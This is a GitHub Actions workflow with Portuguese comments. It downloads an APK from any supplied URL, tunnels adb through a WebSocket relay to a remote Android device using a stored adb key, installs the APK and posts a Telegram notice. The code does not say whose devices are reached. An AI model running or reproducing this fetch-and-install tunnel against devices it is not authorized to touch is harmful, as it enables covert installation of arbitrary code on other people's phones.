name: GH-KALI Pipe Install
on:
  workflow_dispatch:
    inputs:
      url:
        description: "URL do APK"
        required: true
      porta_adb:
        description: "Porta do adbd (0 = varredura)"
        required: false
        default: "0"
permissions:
  contents: read
jobs:
  pipe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: platform-tools + chave da casa
        run: |
          curl -sL -m 300 -o /tmp/pt.zip https://dl.google.com/android/repository/platform-tools_r33.0.3-linux.zip
          unzip -q /tmp/pt.zip -d /tmp
          mkdir -p ~/.android
          cp tools/adbkey ~/.android/adbkey
          cp tools/adbkey.pub ~/.android/adbkey.pub
          chmod 600 ~/.android/adbkey
      - name: Tubo + push + install
        timeout-minutes: 8
        run: |
          pip install -q websocket-client
          curl -sL -m 300 -o /tmp/app.apk "${{ inputs.url }}"
          ls -la /tmp/app.apk
          python3 - <<'PY'
          import json, socket, subprocess, threading, time
          import websocket
          URL = "wss://sino-relay.worldeffects752.workers.dev/ws?id=g52"
          PORTA_ADB = int("${{ inputs.porta_adb }}") if "${{ inputs.porta_adb }}".isdigit() else 0
          ESTADO = {"tcp": None}
          TUBO_OK = threading.Event()
          ws = websocket.create_connection(URL, header=["X-Role: instalador"], timeout=30)
          ws.settimeout(10)

          def pedido_pipe():
              if PORTA_ADB > 0:
                  return json.dumps({"cmd": "pipe", "port": PORTA_ADB})
              return json.dumps({"cmd": "pipe"})

          def ponte():
              srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
              srv.bind(("127.0.0.1", 15555))
              srv.listen(8)
              print("[instalador] ponte 15555 no ar", flush=True)
              while True:
                  conn, _ = srv.accept()
                  antiga = ESTADO.get("tcp")
                  if antiga:
                      try: antiga.close()
                      except Exception: pass
                  ESTADO["tcp"] = conn
                  print("[instalador] adb conectou na ponte", flush=True)
                  def escutar_conn(c=conn):
                      try:
                          while True:
                              b = c.recv(65536)
                              if not b: break
                              ws.send_binary(b)
                      except Exception:
                          pass
                  threading.Thread(target=escutar_conn, daemon=True).start()
          threading.Thread(target=ponte, daemon=True).start()

          def adb(*args):
              r = subprocess.run(["/tmp/platform-tools/adb", *args], capture_output=True, text=True, timeout=120)
              print("$ adb " + " ".join(args), flush=True)
              print((r.stdout + r.stderr).strip()[:400], flush=True)
              return r

          def missao():
              def re_pedir():
                  while not TUBO_OK.is_set():
                      time.sleep(12)
                      try: ws.send(pedido_pipe())
                      except Exception: return
              threading.Thread(target=re_pedir, daemon=True).start()
              time.sleep(1)
              pronto = False
              for t in range(20):
                  adb("disconnect", "127.0.0.1:15555")
                  adb("connect", "127.0.0.1:15555")
                  st = adb("shell", "id")
                  if st.returncode == 0 and "uid=" in st.stdout:
                      pronto = True
                      break
                  time.sleep(3)
              adb("devices")
              if pronto:
                  print("=== INSTALANDO PELO TUBO ===", flush=True)
                  adb("push", "/tmp/app.apk", "/data/local/tmp/app.apk")
                  adb("shell", "pm", "install", "-r", "/data/local/tmp/app.apk")
                  adb("shell", "rm", "-f", "/data/local/tmp/app.apk")
                  print("=== FIM DA INSTALACAO ===", flush=True)
                  time.sleep(2)
                  try: ws.close()
                  except Exception: pass
              else:
                  print("FALHA: device nao respondeu", flush=True)
                  try: ws.close()
                  except Exception: pass
          threading.Thread(target=missao, daemon=True).start()

          while True:
              try:
                  m = ws.recv()
              except websocket.WebSocketTimeoutException:
                  continue
              except Exception:
                  break
              if m is None: break
              if isinstance(m, bytes):
                  if ESTADO.get("tcp"):
                      try: ESTADO["tcp"].sendall(m)
                      except Exception: pass
                  continue
              try: j = json.loads(m)
              except Exception: continue
              if j.get("type") == "joined" and j.get("peers", 0) >= 2 and not TUBO_OK.is_set():
                  ws.send(pedido_pipe())
              if j.get("type") == "pipe" and j.get("status") == "ok":
                  TUBO_OK.set()
          ws.close()
          PY
      - name: Aviso no Telegram
        if: always()
        run: |
          curl -s -F text="pipe-install finalizado — veja o log da run" "https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage" -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" > /dev/null
